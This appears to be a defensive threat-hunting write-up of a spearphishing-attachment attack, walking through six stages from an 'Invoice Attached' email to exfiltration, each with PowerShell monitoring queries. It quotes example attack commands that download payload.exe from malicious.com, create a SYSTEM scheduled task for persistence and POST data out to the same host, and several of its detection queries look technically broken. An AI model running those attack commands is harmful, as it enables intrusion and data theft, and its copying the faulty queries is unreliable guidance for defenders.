Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an adversary uses a spearphishing email with a malicious attachment to gain initial access to a target system. The attack progresses through multiple stages, leveraging various applications such as Outlook for email delivery, and Excel for executing the malicious payload. The attacker orchestrates the flow from the initial email interaction to the execution of a malicious script, ultimately leading to system compromise.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook
   - **User Action**: The user receives an email with a subject line that appears legitimate, such as "Invoice Attached" and opens the email.
   - **Key Artifacts**: Email headers, attachment file (e.g., `Invoice.xlsx`).
   - **Network Indicators**: The email may originate from a suspicious domain (e.g., `malicious.com`).

   ```shell
   # Monitor for incoming emails with suspicious attachments
   Get-Mailbox -Identity user@example.com | Get-MailboxFolderStatistics | Where-Object { $_.FolderPath -like "*Inbox*" } | Get-MailboxFolder | Get-MessageTrace | Where-Object { $_.Subject -like "*Invoice Attached*" }
   ```

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user opens the attachment, which contains a macro designed to execute a PowerShell command.
   - **Key Artifacts**: Excel file (`Invoice.xlsx`), macro code embedded in the document.
   - **Network Indicators**: Potential outbound connections to a command and control (C2) server.

   ```shell
   # Monitor for Excel opening and macro execution
   Get-WinEvent -LogName "Microsoft-Windows-Excel/Operational" | Where-Object { $_.Message -like "*macro*" }
   ```

3. **Macro Execution and PowerShell Command**
   - **Application Involved**: PowerShell
   - **User Action**: The macro executes a PowerShell command that downloads a malicious payload from the internet.
   - **Key Artifacts**: PowerShell command (e.g., `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\Public\payload.exe`).
   - **Network Indicators**: Outbound HTTP/HTTPS requests to `malicious.com`.

   ```shell
   # Monitor PowerShell command execution
   Get-WinEvent -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*Invoke-WebRequest*" }
   ```

4. **Payload Execution**
   - **Application Involved**: Windows Explorer
   - **User Action**: The downloaded payload is executed, either automatically or through user interaction.
   - **Key Artifacts**: Executable file (`payload.exe`), process creation logs.
   - **Network Indicators**: Further outbound connections to the C2 server for data exfiltration or additional commands.

   ```shell
   # Monitor for execution of the downloaded payload
   Get-WinEvent -LogName "Security" | Where-Object { $_.EventID -eq 4688 -and $_.NewProcessName -like "*payload.exe*" }
   ```

5. **Establishing Persistence**
   - **Application Involved**: schtasks.exe
   - **User Action**: The payload creates a scheduled task to ensure persistence on the system.
   - **Key Artifacts**: Scheduled task creation command (e.g., `schtasks /create /tn "MaliciousTask" /tr "C:\Users\Public\payload.exe" /sc ONLOGON /ru SYSTEM`).
   - **Network Indicators**: None at this stage, but the task will ensure future connections to the C2 server.

   ```shell
   # Monitor for scheduled task creation
   Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" | Where-Object { $_.Message -like "*create*" -and $_.Message -like "*MaliciousTask*" }
   ```

6. **Data Exfiltration**
   - **Application Involved**: PowerShell or other scripting tools
   - **User Action**: The attacker uses the established connection to exfiltrate data from the compromised system.
   - **Key Artifacts**: PowerShell commands for data exfiltration (e.g., `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`).
   - **Network Indicators**: Outbound connections to the C2 server with sensitive data.

   ```shell
   # Monitor for data exfiltration attempts
   Get-WinEvent -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*Invoke-WebRequest*" -and $_.Message -like "*exfiltrate*" }
   ```
